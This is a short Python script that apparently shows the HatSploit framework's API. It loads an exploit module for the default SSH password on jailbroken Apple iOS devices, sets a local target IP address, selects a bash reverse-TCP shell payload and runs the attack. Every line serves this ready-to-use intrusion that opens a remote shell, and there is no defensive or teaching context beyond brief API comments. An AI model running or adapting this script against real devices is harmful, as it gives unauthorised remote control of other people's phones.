from hatsploit.lib.runtime import Runtime # Import HatSploit Runtime API
from hatsploit.lib.modules import Modules # Import HatSploit Modules API

runtime = Runtime() # Load HatSploit Runtime API
modules = Modules() # Load HatSploit Modules API

runtime.start()                                                    # Start HatSploit Framework
modules.use_module("exploit/apple_ios/ssh/cydia_default_password") # Select module

runtime.update() # Update HatSploit states

modules.set_current_module_option('HOST', '192.168.1.68')                     # Set module option (target host)
modules.set_current_module_option('PAYLOAD', 'unix/generic/bash_reverse_tcp') # Set module option (payload)

runtime.catch(modules.run_current_module) # Run current module and catch exceptions
